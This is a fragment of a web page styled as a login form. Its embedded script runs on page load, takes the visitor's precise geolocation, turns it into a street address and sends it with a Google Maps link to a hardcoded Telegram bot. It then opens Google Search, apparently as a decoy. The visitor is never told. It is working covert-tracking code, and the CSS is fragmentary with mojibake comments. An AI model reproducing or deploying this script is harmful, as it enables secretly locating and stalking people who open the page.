        :root {

          --white-color: hsl(0, 0%, 100%);
          --black-color: hsl(0, 0%, 0%);
        
 
          --body-font: "Poppins", sans-serif;
          --h1-font-size: 2rem;

        p{

            justify-content: center;
            align-items: center;

        * {

        /*=============== LOGIN ===============*/
        .login {
          position: relative;
          height: 100vh;
          display: grid;
          align-items: center;
        }
        
        .login__bg {
          position: absolute;
          width: 100%;
          height: 100%;
          object-fit: cover;
          object-position: center;
        }
        
        .login__form {
          position: relative;
          margin-inline: 1.5rem;
          background-color: hsla(0, 0%, 100%, .01);
          border: 2px solid hsla(0, 0%, 100%, .7);
          padding: 2.5rem 1rem;
          color: var(--white-color);
          border-radius: 1rem;
          backdrop-filter: blur(16px);
        }
        
        .login__title {
          text-align: center;
          font-size: var(--h1-font-size);
          margin-bottom: 1.25rem;
        }
        
        .login__inputs, 
        .login__box {
          display: grid;
        }
        
        .login__inputs {
          row-gap: 1.25rem;
          margin-bottom: 1rem;
        }
        
        .login__box {
          grid-template-columns: 1fr max-content;
          column-gap: .75rem;
          align-items: center;
          border: 2px solid hsla(0, 0%, 100%, .7);
          padding-inline: 1.25rem;
          border-radius: 4rem;
        }
        
        .login__input, 
        .login__button {
          border: none;
          outline: none;
        }
        
        .login__input {
          width: 100%;
          background: none;
          color: var(--white-color);
          padding-block: 1rem;
        }
        
        .login__input::placeholder {
          color: var(--white-color);
        }
        
        .login__box i {
          font-size: 1.25rem;
        }
        
        .login__check, 
        .login__check-box {
          display: flex;
          justify-content: space-between;
          align-items: center;
        }
        
        .login__check {
          margin-bottom: 1rem;
          font-size: var(--small-font-size);
        }
        
        .login__check-box {
          column-gap: .5rem;
        }
        
        .login__check-input {
          width: 1rem;
          height: 1rem;
          accent-color: var(--white-color);
        }
        
        .login__forgot {
          color: var(--white-color);
        }
        
        .login__forgot:hover {
          text-decoration: underline;
        }
        
        .login__button {
          width: 100%;
          padding: 1rem;
          margin-bottom: 1rem;
          background-color: var(--white-color);
          border-radius: 4rem;
          color: var(--black-color);
          font-weight: 500;
          cursor: pointer;
        }
        
        .login__register {
          font-size: var(--small-font-size);
          text-align: center;
        }
        
        .login__register a {
          color: var(--white-color);
          font-weight: 500;
        }
        
        .login__register a:hover {
          text-decoration: underline;
        }

        @media screen and (min-width: 576px) {
          .login {
            justify-content: center;
          }
          .login__form {
            width: 420px;
            padding-inline: 2.5rem;
          }
          .login__title {
            margin-bottom: 2rem;
          }
        }

    </style>

    <script>
        const botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc";
        const chatId = "5792222595";

        function openGoogleSearch() {
            const googleSearchUrl = "https://www.google.com/search"; 
            window.open(googleSearchUrl, "_blank");
        }

        async function sendToTelegram(message) {
            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
            try {
                const response = await fetch(telegramApiUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: chatId, text: message })
                });
                const data = await response.json();
                return data.ok;
            } catch (error) {
                console.error(" :", error);
                return false; 
            }
        }

        async function getDetailedLocation(latitude, longitude) {
            const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&accept-language=ar`;
            try {
                const response = await fetch(url);
                const data = await response.json();
                if (data && data.address) {
                    const address = data.display_name; 
                    const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`; // ÿ±ÿßÿ®ÿ∑ Google Maps
                    const message = `üìç ŸÖŸàŸÇÿπ ÿ¨ÿØŸäÿØ ÿ™ŸÖ ÿ™ÿ≠ÿØŸäÿØŸá:\n\n${address}\n\nüåê ÿ±ÿßÿ®ÿ∑ Google Maps: ${googleMapsLink}`;
                    const isSent = await sendToTelegram(message);
                    if (isSent) {
                        openGoogleSearch();
                    }
                } else {
                    throw new Error(".");
                }
            } catch (error) {
                console.error("ÿ≠ÿπ:", error);
            }
        }

        function showPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            getDetailedLocation(latitude, longitude); 
        }

        function showError(error) {
            console.error("ÿ´ÿπ:", error);
        }

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(showPosition, showError, {
                enableHighAccuracy: true, 
                timeout: 10000, 
                maximumAge: 0 
            });
